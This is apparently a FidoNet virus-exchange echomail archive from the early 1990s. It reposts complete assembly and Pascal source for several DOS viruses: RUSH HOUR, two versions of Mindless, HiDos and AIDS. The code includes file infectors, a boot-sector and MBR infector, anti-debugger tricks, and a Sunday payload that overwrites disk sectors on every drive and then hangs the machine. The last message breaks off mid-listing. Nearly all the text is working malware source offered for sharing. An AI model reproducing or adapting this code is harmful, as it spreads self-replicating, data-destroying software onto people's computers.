.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 58 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:13 
 To   : -  *.*  -                                                               
 Subj : RUSHHOUR.DSM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5f7d
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Dr T , 2:283/718 (06 Nov 94 16:49)
* To   : Clif Jessop
* Subj : RUSHHOUR.DSM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Dr.T.@f718.n283.z2.fidonet.org
    PAGE 72,132
    TITLE Virus "RUSH HOUR" V1.0 (p) Foxi, 1986
    NAME VIRUS

ABS0        SEGMENT AT 0
        ORG 4*10h
VIDEO_INT   DW  2 DUP (?)   ; Video Interrupt

        ORG 4*21h
DOS_INT     DW  2 DUP (?)   ; DOS Interrupt

        ORG 4*24h
ERROR_INT   DW  2 DUP (?)   ; ERROR Interrupt
ABS0        ENDS

code    SEGMENT
    assume  cs:code, ds:code, es:code

    ORG 05Ch
FCB LABEL BYTE
DRIVE   DB  ?
FSPEC   DB  11 DUP (' ')    ; Filename
    ORG 6Ch
FSIZE   DW  2 DUP (?)
FDATE   DW  ?       ; date of last modifcation

FTIME   DW  ?       ; time of last mod
    ORG 80h
    DTA DW 128 DUP (?)  ; Disk Transfer Area (DTA)
    ORG 071Eh       ; END OF THE NORMAL KEYBGR.COM

    xor ax, ax
    mov es, ax      ; ES points to ABS0
    assume es:ABS0

    push cs
    pop ds

    mov ax, VIDEO_INT       ; store old interrupt vectors
    mov bx, VIDEO_INT+2
    mov word ptr VIDEO_VECTOR, ax
    mov word ptr VIDEO_VECTOR+2, bx
    mov ax, DOS_INT
    mov bx, DOS_INT+2
    mov word ptr DOS_VECTOR, ax
    mov word ptr DOS_VECTOR+2, bx
    cli
    mov DOS_INT, OFFSET VIRUS   ; new DOS vector points to VIRUS

    mov DOS_INT+2, cs
    mov VIDEO_INT, OFFSET DISEASE   ; video vector points to DISEASE
    mov VIDEO_INT+2, cs
    sti

    mov ah, 0       ; Get system time
    int 1Ah         ; read TimeOfDay (TOD)
    mov TIME_0, dx      ; CX:DX = number of clock ticks since midnight

    lea dx, VIRUS_ENDE
    int 27h         ; terminate program & remain resident (TSR)

VIDEO_VECTOR    DD  (?)
DOS_VECTOR  DD  (?)
ERROR_VECTOR    DW  2 DUP (?)
TIME_0      DW  ?

;
; VIRUS main program
;
; 1. System call AH=4BH?
;    No: --> 2
;    Yes: Test for KEYBGR.COM on specified drive
;     Already infected?
;     Yes :--> 3.
;     No  : Infection!
;
; 2. Jump to normal DOS

RNDVAL  DB  'bfhg'
ACTIVE  DB  0       ; not active
PRESET  DB  0       ; first virus not active

    DB  'A:'
FNAME   DB  'KEYBGR  COM'
    DB  0

VIRUS   PROC    FAR
    assume cs:code, ds:nothing, es:nothing

    push ax
    push cx
    push dx

    mov ah, 0       ; check if at least 15 minutes
    int 1ah         ; have elapsed since installation.

    sub dx, TIME_0
    cmp dx, 16384       ; 16384 ticks on the clock=15 minutes
    jl $3
    mov ACTIVE, 1       ; if so, activate virus

  $3:   pop dx
    pop cx
    pop ax

    ; disk access because of the DOS command
    ; "Load & execute program" ?
    cmp ax, 4B00h
    je $1

EXIT_1:
    jmp DOS_VECTOR      ; No: --> continue as normal

  $1:   push es         ; ES:BX --> parameter block
    push bx         ; DS:DX --> filename
    push ds         ; save registers which will be needed
    push dx         ; for INT 21H (AH=4Bh)

    mov DI, dx
    mov DRIVE, 0        ; set the drive of the program
    mov al, ds:[DI+1]   ; to be executed
    cmp al, ':'
    jne $5

    mov al, ds:[DI]
    sub al, 'A'-1
    mov DRIVE, al

  $5:   cld
    push cs
    pop ds
    xor ax, ax
    mov es, ax
    assume ds:code, es:ABS0

    mov ax, ERROR_INT   ; ignore all disk "errors"
    mov bx, ERROR_INT+2 ; with our own error routine
    mov ERROR_VECTOR, ax
    mov ERROR_VECTOR+2, bx
    mov ERROR_INT, OFFSET ERROR
    mov ERROR_INT+2, cs

    push cs
    pop es
    assume es:code

    lea dx, DTA     ; DS:DX -> Disk Transfer Area (DTA)
    mov ah, 1Ah     ; SET DISK TRANSFER AREA ADDRESS
    int 21h
    mov bx, 11      ; transfer the filename

  $2:
    mov al, fname-1[bx] ; into File Control Block (FCB)
    mov FSPEC-1[bx], al
    DEC bx
    JNZ $2

    lea dx, FCB     ; open file (for writing)
    mov ah, 0FH
    int 21H

    cmp al, 0
    jne EXIT_0      ; file does not exist --> end

    mov BYTE PTR FCB + 20h, 0
    mov ax, FTIME       ; file already infected?
    cmp ax, 4800h
    je EXIT_0       ; YES --> END

    mov PRESET, 1       ; (All copies are virulent !)
    mov SI, 100H        ; write the virus in the file

   $4:
    lea DI, DTA
    mov cx, 128
    REP MOVSB
    lea dx, FCB         ; DS:DX -> opened FCB
    mov ah, 15h         ; SEQUENTIAL WRITE TO FCB FILE
    int 21h

    cmp SI, OFFSET VIRUS_ENDE
    jl $4

    mov FSIZE, OFFSET VIRUS_ENDE - 100H
    mov FSIZE+2, 0      ; set correct file size
    mov FDATE, 0AA3h    ; set correct date (3-5-86)
    mov FTIME, 4800h    ; set time (09:00:00)

    lea dx, FCB     ; close file
    mov ah, 10h
    int 21h

    xor ax, ax
    mov es, ax
    assume es:ABS0

    mov ax, ERROR_VECTOR    ; reset the error interrupt
    mov bx, ERROR_VECTOR+2
    mov ERROR_INT, ax
    mov ERROR_INT+2, bx

   EXIT_0:
    pop dx          ; restore the saved registers
    pop ds
    pop bx
    pop es
    assume ds:nothing, es:nothing

    mov ax, 4B00h       ; "EXEC" - LOAD AND EXECUTE PROGRAM
    jmp DOS_VECTOR      ; normal function execution

VIRUS   ENDP

ERROR   PROC FAR
    IRET            ; simply ignore all errors...

ERROR   ENDP

DISEASE PROC FAR
    assume ds:nothing, es:nothing
    push ax         ; Save registers
    push cx

    test PRESET, 1
    jz EXIT_2

    test ACTIVE, 1
    jz EXIT_2

    IN  al, 61h     ; Enable speak (Bit 0 := 0)
    AND al, 0feh
    OUT 61h, al

    mov cx, 3           ; index loop cx
 NOISE:             ; generate Noise
    mov al, RNDVAL
    xor al, RNDVAL + 3
    SHL al, 1
    SHL al, 1
    RCL WORD PTR RNDVAL, 1
    RCL WORD PTR RNDVAL+2, 1

    mov ah, RNDVAL      ; output some bit
    and ah, 2       ; of the feedback
    IN al, 61h      ; shift register
    and al, 0FDh        ; --> noise from speaker
    OR al, ah
    OUT 61H, al

    LOOP NOISE

    and al, 0FCh        ; turn speaker off
    OR al,1
    OUT 61H, al

 EXIT_2:
    pop cx
    pop ax
    jmp VIDEO_VECTOR    ; jump to normal VIDEO routine ...

DISEASE ENDP

    DB 'This program is a VIRUS program.'
    DB 'Once activated it has control over all'
    DB 'system devices and even over all storage'
    DB 'media inserted by the user.  It continually'
    DB 'copies itself into uninfected operating'
    DB 'systems and thus spreads uncontrolled.'

    DB 'The fact that the virus does not destroy any'
    DB 'user programs or erase the disk is merely due'
    DB 'to a philanthropic trait of the author......'

    ORG 1C2Ah

VIRUS_ENDE  LABEL BYTE

code    ends

    end

-+-  Concord/QWK O.O1 Beta-7
 + Origin: FidoNet * Mathieu NotВris * Brussels-Belgium-Europe (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/os,/o,/op,/oiObject code: standard, standard w/overlays, Phar Lap, or IBM

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 59 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:13 
 To   : -  *.*  -                                                               
 Subj : MINDLESS.DSM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5f83
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Mark Hapershaw, 2:283/718 (06 Nov 94 16:49)
* To   : Hans Schotel
* Subj : MINDLESS.DSM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Mark.Hapershaw@f718.n283.z2.fidonet.org
;   The Mindless V1.0 Virus
;
;   Type:  *.COM Overwriter
;
;   Programmer:  Natas Kaupas

;   Notes:
;
;       Read the texts that come with this for all of the necessary
;   info...if you've got any questions contact me on any YAM Dist. Sites.
;
;   I Couldn't Have Made This Without:
;
;   Soltan Griss        -Kode4
;   Data Disruptor      -encrypted part
;   Mr. Mike        -typematic delay thing
;   And Everyone I Forgot!

seg_a       segment byte public
        assume  cs:seg_a, ds:seg_a
        org     100h


MINDL           proc    far
start           label   near
        db  0E9h,00h,00h

vstart      equ $

    mov cx,09EBh        ;debug killer
    mov ax,0FE05h       ;
    jmp $-2         ;
    add ah,03Bh         ;
    jmp $-10            ;

        push    ds          ;save old data segment
        sub     ax,ax       ;put zero in ax
        push    ax          ;save it on stack

    mov ah,2ah          ;get date
    int 21h
    cmp al,0            ;is it a Sunday?
    jne rater           ;no...don't format then

doom:
    mov ax,3301h        ;turn off ^C Check
    xor dl,dl           ;0
    int 21h

    mov cx,lident       ;this all has to do with the encrypted
    mov si,offset ident     ;message
    mov di,offset dest      ;
doshit:
    mov al,ds:[si]          ;unencrypt message
    mov temp,al             ;
    xor byte ptr ds:[temp],01h      ;
    mov al,temp             ;
    mov [di],al             ;
    inc si              ;
    inc di              ;
    loop    doshit              ;loop back and finish it
doomb:
    cmp drive,27        ;format all drives
    jge boot            ;done...then end (boot)
    pushf               ;push flags on
    mov al,drive        ;find drive
    mov cx,sectors      ;find sectors
    mov dx,0            ;start at sector 0
    mov bx,offset dest      ;write encrypted message
    int 26h         ;format
    popf                ;pop flags off
    inc drive           ;go up to next drive
    jmp doomb           ;repeat

;this was originally going to boot...but for some reason it couldn't format in
;time (before the boot), so it didn't format...oh well.

boot:
    mov dl,2ch      ;get system time
    int 21h
    and dl,0Fh      ;AND 100th seconds by 0Fh
    or  dl,dl       ;0?
    jz  locker      ;yes..then lock up system

    mov cx,1980         ;date, 1980
    mov dx,0            ;mon/day, 0
    mov ah,2Bh          ;set date
    int 21h
    mov cx,0            ;hrs/min, 0
    mov dx,0            ;sec, 0
    mov ah,2Dh          ;set time
    int 21h
    mov ax,3301h        ;turn ^C Check back on
    mov dl,1            ;1
    int 21h
    mov ax,4c00h        ;end with error message 00
    int 21h

locker:
    jmp $           ;lock up computer

rater:
    mov al,dl
    mov dl,0c0h     ;unkown ms, really grinds on mine though!
    jz  valid       ;it must be around 15ms
                ;which is slow considering default is 9ms
                ;and most floppies can actually go under 6ms

valid:
        push    ds          ;Save the data segment
        mov     bx,78h      ;point to pointer for floppy drive tables
        mov     ax,0
        mov     ds,ax       ;set to segment 0
        mov     ax,[bx]     ;get the pointer
        mov     bx,ax       ;into the bx register
        mov     al,[bx]     ;now get the present step rate
        and     al,0fh      ;remove the old step rate
        or      al,dl       ;put in the new step rate
        mov     [bx],al     ;and put it back where it goes
        mov     ah,0        ;now call on the BIOS to
        int     13h         ;reload the set floppy disk controller
        pop     ds          ;Reset the Data Segment

go_on:

    push    ds      ;save present data segment

    mov bx,78h      ;point to pointer for floppy drive tables
    mov ax,0
    mov ds,ax       ;set to segment 0
    mov ax,[bx]     ;get the pointer
    mov bx,ax       ;into the bx register
    mov al,[bx]     ;now get the step rate
    pop ds
    push    ax      ;save the step rate on the stack


typematic:
    mov bl,repeat       ;get the parameters
    mov bh,init         ;
    mov ax,305h         ;set typematic rate and delay
    int 16h         ;
    xor al,al           ;errorlevel = 0

n_start:    mov     ah,4Eh             ;Find first Com file in directory
        mov     dx,offset filename ;use "*.com"
        int     21h

Back:
        mov     ah,43h              ;get rid of read only protection
        mov     al,0            ;
        mov     dx,9eh          ;
        int     21h         ;
        mov     ah,43h          ;
        mov     al,01           ;
        and     cx,11111110b        ;
        int     21h         ;

        mov     ax,3D01h           ;Open file for writing
        mov     dx,9Eh             ;get file name from file data area
        int     21h

        mov     bx,ax               ;save handle in bx
        mov     ah,57h              ;get time date
        mov     al,0
        int     21h

        push    cx                  ;put in stack for later
        push    dx


        mov     dx,100h            ;Start writing at 100h
        mov     cx,(vend-vstart)        ;write ?? bytes
        mov     ah,40h             ;Write Data into the file
        int     21h


        pop     dx                 ;Restore old dates and times
        pop     cx
        mov     ah,57h
        mov     al,01h
        int     21h



        mov     ah,3Eh             ;Close the file
        int     21h

        mov     ah,4Fh             ;Find Next file
        int     21h

        jnc     Back

done:

           int     20h                ;Terminate Program

V_Length        equ     vend-vstart

drive   db  ?
sectors dw  456

filename        db      "*.c*",0

ident   db  "ZXntofrudsr!@f`horu!Lb@ggdd\!,O@U@R!J@TQ@R",13,10
    db  "Uid!Lhoemdrr!Whstr!w0/1!",13,10

;encrypted message:
;ident  db  "[Youngsters Against McAffee] -NATAS KAUPAS",13,10
;   db  "The Mindless Virus v1.0 ",13,10

lident  equ $-ident
dest    db  [lident-1/2] dup (?)
temp    db  0

repeat      equ 250
init        equ 0

mindl           endp

vend        equ $

seg_a           ends

        end     start

-+-  GoldED/386 2.50.B1016+
 + Origin: ViRUS PaRk BbS >916< 387-6159 24HouRs (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/L            Specify library search paths

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 60 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:14 
 To   : -  *.*  -                                                               
 Subj : HIDOS.ASM                                                               
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5f89
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Daniel Hendry, 2:283/718 (06 Nov 94 16:50)
* To   : Doug Bryce
* Subj : HIDOS.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Daniel.Hendry@f718.n283.z2.fidonet.org
        NAME boot
        PAGE 55,132
        TITLE FILE UTIL




code segment

        ASSUME CS:CODE,DS:CODE,ES:CODE

        org 100h

main:           jmp over
                db '['
id              db 'HiDos]',0
by              db 'By Apache',0
over:           xor ax,ax
                mov ds,ax
                cli
                mov ss,ax
                mov sp,7c00h
                sti
                mov ax,ds:[004eh]
                mov word ptr ds:[int13+7b02h],ax
                mov ax,ds:[004ch]
                mov word ptr ds:[int13+7b00h],ax
                mov ax,ds:[0413h]
                dec ax
                dec ax
                mov ds:[0413h],ax
                mov cl,06h
                shl ax,cl
                mov es,ax
                mov word ptr ds:[bigj+7b02h],es
                mov ax,offset jumpt
                mov word ptr ds:[bigj+7b00h],ax
                mov cx,0400h
                push cs
                pop ds
                mov si,7c00h
                mov di,0100h
                cld
                repz
                movsb
                push cs
                pop ds
                jmp cs:[bigj+7b00h]

jumpt:          push cs
                pop ds
                mov si,offset drive
                cmp byte ptr ds:[si],80h
                jz hdone
                mov bx,0300h
                mov cx,0001h
                mov dx,0080h
                push cs
                pop es
                call hdread
                cmp ds:[0304h],'iH'
                jz hdone
                mov bx,0300h
                mov cx,0007h
                mov dx,0080h
                call hdwrit
                mov si,04beh
                mov di,02beh
                mov cx,0042h
                cld
                repz
                movsb
                mov byte ptr ds:[drive],80h
                mov bx,0100h
                mov cx,0001h
                mov dx,0080h
                call hdwrit
                mov byte ptr ds:[drive],00h

hdone:          xor ax,ax
                mov word ptr cs:[boot+2],ax
                mov es,ax
                push cs
                pop ds
                mov ax,0201h
                mov bx,7c00h
                mov word ptr ds:[boot],bx
                mov si,offset drive
                cmp byte ptr ds:[si],80h
                jz hload
                mov cx,0003h
                mov dx,0100h
                jmp fload
hload:          mov cx,0007h
                mov dx,0080h
fload:          mov di,'rv'
                int 13h
                mov si,offset drive
                mov byte ptr cs:[si],00h
                xor ax,ax
                mov es,ax
                mov ds,ax
                mov ax,offset nint13
                mov ds:[004ch],ax
                mov ds:[004eh],cs
                push cs
                pop ds
                jmp cs:[boot]

hdwrit:         mov ax,0301h
                mov di,'rv'
                jmp xx4
hdread:         mov ax,0201h
                mov di,'rv'
xx4:            int 13h
                ret

nint13:         cmp di,'rv'
                jz iv13
                cmp ah,02h
                jnz wcheck
                cmp cl,01h
                jnz wcheck
                cmp dh,00h
                jnz wcheck
                cmp dl,80h
                jz check1
                cmp dl,00h
                jnz wcheck
check1:         push ax
                push bx
                push cx
                push dx
                push ds
                push es
                push di
                mov bx,0300h
                push cs
                pop es
                call hdread
                mov si,offset [id+0200h]
                cmp es:[si],'iH'
                jz redirect
                jmp iflopd
redirect:       cmp dl,80h
                jnz rdirfl
                pop di
                pop es
                pop ds
                pop dx
                pop cx
                pop bx
                pop ax
                mov cx,0007h
                jmp a13

rdirfl:         pop di
                pop es
                pop ds
                pop dx
                pop cx
                pop bx
                pop ax
                mov cx,0003h
                mov dx,0100h
a13:            mov ax,0201h
iv13:           jmp v13


wcheck:         cmp ah,03h
                jnz v13
                cmp dl,00h
                jnz v13
                push ax
                push bx
                push cx
                push dx
                push ds
                push es
                push di
                push cs
                pop es
                mov bx,0300h
                mov cx,0001h
                xor dx,dx
                call hdread
                mov si,offset [id+0200h]
                cmp es:[si],'iH'
                jz iflopd
                mov cx,0003h
                mov dx,0100h
                mov bx,0300h
                call hdwrit
                mov bx,0100h
                xor dx,dx
                mov cx,0001h
                call hdwrit
iflopd:         pop di
                pop es
                pop ds
                pop dx
                pop cx
                pop bx
                pop ax
v13:            db 0eah
int13           dd 0h
drive           db 0h
bigj            dd 0h
boot            dd 0h

code ends

end main

-+-  GEcho 1.10+
 + Origin: Hans' Point with DOSBoss West, Amsterdam (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/i            Initialize all segments

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 61 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:14 
 To   : -  *.*  -                                                               
 Subj : MINDLESS.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5f91
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Fred Lee, 2:283/718 (06 Nov 94 16:51)
* To   : Gilbert Holleman
* Subj : MINDLESS.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Fred.Lee@f718.n283.z2.fidonet.org
;



mindless   segment byte
           assume cs:mindless,ds:mindless,ss:mindless

        org     100h

victem  equ     09Eh

yam     proc near

        jmp     virus_fix       ;location of victem name
yam     endp

virus_fix proc near
                                ;attempt crashing debugger
        mov     cx,09ebh        ;fake command
        mov     ax,0fe05h       ;fake command
        jmp     short $-2       ;do real commands

        adc     ah,3bh          ;fake command
        jmp     short $-10      ;do real commands


        push    ds
        xor     ax,ax           ;instead of XORring ax, you
                                ;should work out it's alue
                                ;after the above mess, then
                                ;subtract it so noone knows
                                ;it's real value.

        push    ax
        mov     ah,2ah          ;Get system date
        int     21h

        cmp     al,0            ;Is it Sunday?
        jne     not_sunday      ;not sunday?  no damage then..

start_damage:
        mov     ax,3301h        ;
        xor     dl,dl           ;determine ctrl/break state
        int     21h

        mov     cx,msg_length   ;prepare to write our messag
        lea     si,message      ;These are the bytes to move

decrypt_message:
        mov     al,byte ptr [si] ;get byte to decrypt
        xor     al,1            ;xor it with 1
       mov     byte ptr [si],al ;store it
        inc     si              ;go to next cypher
        loop    decrypt_message ;get another character

damage:
        cmp     byte ptr drive_num,27 ;have we past drive z?
        ja      no_more_disks   ;if yes, exit damage routine
        pushf                   ;don't let flags be altered
        mov     al,byte ptr drive_num
        mov     cx,word ptr num_secs
        xor     dx,dx           ;first sector
        lea     bx,message      ;data to write
        int     26h             ;absolute write to disk
        popf                    ;restore flags
        inc     byte ptr drive_num ;try another drive
        jmp     short damage    ;

no_more_disks:
        mov     dl,2ch          ;check ctrl/C state
        int     21h
        and     dl,0fh
        or      dl,dl           ;Set Flags
        je      hang_machine
        mov     cx,1980         ;prepare system year
        xor     dx,dx           ;prepare system month and day
        mov     ah,2bh          ;Set system date
        int     21h
        xor     cx,cx           ;prepare system hour/minute
        xor     dx,dx           ;prepare system seconds
        mov     ah,2dh          ;Set system time
        int    21h
        mov     ax,3301h        ;check/set ctrl/C status
        mov     dl,01
        int     21h
        mov     ax,4c00h        ;Drop to DOS, no error code
        int     21h

;
;


hang_machine:
        jmp     $

not_sunday:
        mov     al,dl
        mov     dl,0c0h
        push    ds
        mov     bx,78h
        xor     ax,ax
        mov     ds,ax          ; ds=0
        mov     ax,word ptr [bx]
        mov     bx,ax
        mov     al,byte ptr [bx]
        and     al,0fh
        or      al,dl
        mov     byte ptr [bx],al
        xor     ah,ah           ;reset drive
        int     13h
        pop     ds              ;restore ds

        push    ds              ;keep it stored, though
        mov     bx,78h
        xor     ax,ax
        mov     ds,ax           ;ds=0
        mov     ax,word ptr [bx]
        mov     bx,ax
        mov     al,byte ptr [bx]
        pop     ds              ;restore ds

        push    ax
        mov    bx,0fah         ;ultra hi speed??
        mov     ax,0305h        ;Adjust keyboard rate/delay
        int     16h

        mov     ax,4e00h        ;DOS Search_First
        lea     dx,com_file     ;Look for a COM file
        int     21h

infect:
        mov     ax,4300h        ;get/set file attribs
        mov     dx,offset victem
        int     21h
        mov     ax,4301h        ;get/set file attribs
        and     cx,00feh        ;
        int     21h
        mov     ax,3d01h        ;open file
        mov     dx,offset victem
        int     21h
       mov     bx,ax           ;file handle
        mov     ax,5700h        ;get file time
        int     21h
        push    cx               ;store it
        push    dx               ;stor it
        mov     dx,0100h
        mov     cx,01a7h
        mov     ah,40h
        int     21h              ;write file using file handle
        pop     dx
        pop     cx
        mov     ax,5701h
        int     21h              ;set file date & time
        mov     ah,3eh           ;close file via handle
        int     21h
        mov     ah,4fh           ;DOS Search_Next
        int     21h
        ja      infect           ;infect if good one found
        int     20h              ;bail out

drive_num db    0
num_secs  dw    20              ;should be enough to kill with

com_file  db     '*.COM',0      ;'*.c*' leaves too much room
                                        ; for error.

;       This was not encrypted properly!!
;       I have corrected what I could figure out.

message db      0fah            ;??What's this??

        db      'Xntmfrsddr!'   ;Youngsters
        db      '@f`hmrs!'      ;Against
        db      'Lb@eedd'       ;McAffee

        db      '\!,'
        db      'O@U@R!L@TO@T' ;NATAS KAUPAS

        db      0ffh,0ffh       ;spaces (cr/lf not useful...)

        db     'Uid!Lhoemdrr!Whstr!w1/0!' ;virus name, version
msg_length equ  $-message


virus_fix  endp
mindless   ends
           end     yam

-+-  Terminate 1.50/Pro
 + Origin: <Rudy's Place - Israel> Hard disks never die... (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/P[=NNNNN]    Pack code segments

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 62 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:14 
 To   : -  *.*  -                                                               
 Subj : AIDS.PAS                                                                
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5f98
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Mike Nisbett, 2:283/718 (06 Nov 94 16:52)
* To   : Alan Jones
* Subj : AIDS.PAS
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Mike.Nisbett@f718.n283.z2.fidonet.org
{C-}
{U-}
{I-}       { Won't allow a user break, enable IO check }

{ -- Constants --------------------------------------- }

Const
     VirusSize = 13847;    { AIDS' code size }

     Warning   :String[42]     { Warning message }
     = 'This File Has Been Infected By AIDS! HaHa!';

{ -- Type declarations------------------------------------- }

Type
     DTARec    =Record      { Data area for file search }
     DOSnext  :Array[1..21] of Byte;
                   Attr    : Byte;
                   Ftime,
                   FDate,
                   FLsize,
                   FHsize  : Integer;
                   FullName: Array[1..13] of Char;
                 End;

Registers    = Record    {Register set used for file search }
   Case Byte of
   1 : (AX,BX,CX,DX,BP,SI,DI,DS,ES,Flags : Integer);
   2 : (AL,AH,BL,BH,CL,CH,DL,DH          : Byte);
   End;

{ -- Variables--------------------------------------------- }

Var
                               { Memory offset program code }
   ProgramStart : Byte absolute Cseg:$100;
                                          { Infected marker }
   MarkInfected : String[42] absolute Cseg:$180;
   Reg          : Registers;                 { Register set }
   DTA          : DTARec;                       { Data area }
   Buffer       : Array[Byte] of Byte;        { Data buffer }
   TestID       : String[42]; { To recognize infected files }
   UsePath      : String[66];        { Path to search files }
                                    { Lenght of search path }
   UsePathLenght: Byte absolute UsePath;
   Go           : File;                    { File to infect }
   B            : Byte;                              { Used }
   LoopVar      : Integer;  {Will loop forever}

{ -- Program code------------------------------------------ }

Begin
  GetDir(0, UsePath);               { get current directory }
  if Pos('\', UsePath) <> UsePathLenght then
    UsePath := UsePath + '\';
  UsePath := UsePath + '*.COM';        { Define search mask }
  Reg.AH := $1A;                            { Set data area }
  Reg.DS := Seg(DTA);
  Reg.DX := Ofs(DTA);
  MsDos(Reg);
  UsePath[Succ(UsePathLenght)]:=#0; { Path must end with #0 }
  Reg.AH := $4E;
  Reg.DS := Seg(UsePath);
  Reg.DX := Ofs(UsePath[1]);
  Reg.CX := $ff;          { Set attribute to find ALL files }
  MsDos(Reg);                   { Find first matching entry }
  IF not Odd(Reg.Flags) Then         { If a file found then }
    Repeat
      UsePath := DTA.FullName;
      B := Pos(#0, UsePath);
      If B > 0 then
      Delete(UsePath, B, 255);             { Remove garbage }
      Assign(Go, UsePath);
      Reset(Go);
      If IOresult = 0 Then          { If not IO error then }
      Begin
        BlockRead(Go, Buffer, 2);
        Move(Buffer[$80], TestID, 43);
                      { Test if file already ill(Infected) }
        If TestID <> Warning Then        { If not then ... }
        Begin
          Seek (Go, 0);
                            { Mark file as infected and .. }
          MarkInfected := Warning;
                                               { Infect it }
          BlockWrite(Go,ProgramStart,Succ(VirusSize shr 7));
          Close(Go);
          Halt;                   {.. and halt the program }
        End;
        Close(Go);
      End;
        { The file has already been infected, search next. }
      Reg.AH := $4F;
      Reg.DS := Seg(DTA);
      Reg.DX := Ofs(DTA);
      MsDos(Reg);
    {  ......................Until no more files are found }
    Until Odd(Reg.Flags);
Loopvar:=Random(10);
If Loopvar=7 then
begin
  Writeln('');                          {Give a lot of smiles}
Writeln('');
Writeln('     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@');
Writeln('     @                            ATTENTION:   @');
Writeln('      I have been elected to inform you that throughout your process
of ');
Writeln('     @ collecting and executing files, you have accidentally HЪЫKф
@');
Writeln('      yourself over; again, that''s PHUCKED yourself over. No, it
cannot ');
Writeln('     @ be; YES, it CAN be, a √чЦs has infected your system. Now what
do @');
Writeln('      you have to say about that? HAHAHAHA. Have HЪе with this one and
');
Writeln('     @                  remember, there is NO cure for   @');
Writeln('  ');
Writeln('     @    ██████████     ████████████    ███████████      ██████████
@');
Writeln('        ███▒▒▒▒▒▒███     ▒▒▒▒██▒▒▒▒▒▒   ██▒▒▒▒▒▒▒███    ███▒▒▒▒▒▒▒██
');
Writeln('     @   ██▒▒      ██▒        ██▒        ██▒       ██▒   ██▒▒       ▒▒
  @');
